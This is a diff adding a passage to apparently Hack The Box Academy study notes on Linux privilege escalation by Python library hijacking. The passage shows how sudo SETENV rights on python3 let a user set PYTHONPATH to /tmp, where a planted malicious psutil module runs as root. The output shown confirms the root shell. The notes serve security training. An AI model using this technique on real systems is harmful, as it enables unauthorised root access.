@@ -98,3 +98,23 @@ def virtual_memory():
 ```
 
 We run the script again, if hijack is successful, we change payload to something else.
+
+The last method was a simple use of PYTHONPATH, however, if we are granted sudo permission on the python binary itself, we can then manipulate PYTHONPATH directly and force python to look for psutil or any other library at a directory of our choice:
+```
+htb-student@lpenix:~$ sudo -l 
+
+Matching Defaults entries for htb-student on ACADEMY-LPENIX:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User htb-student may run the following commands on ACADEMY-LPENIX:
+    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
+```
+Now, we create a malicious psutil like last example, now we move the malicious payload into /tmp and run our program in this manner:
+```
+htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+
+uid=0(root) gid=0(root) groups=0(root)
+...SNIP...
+```
+
+This runs mem_status.py as sudo, however we also appended /tmp/ to the beginning of python path, which means that now python is forced to first locate psutil at /tmp
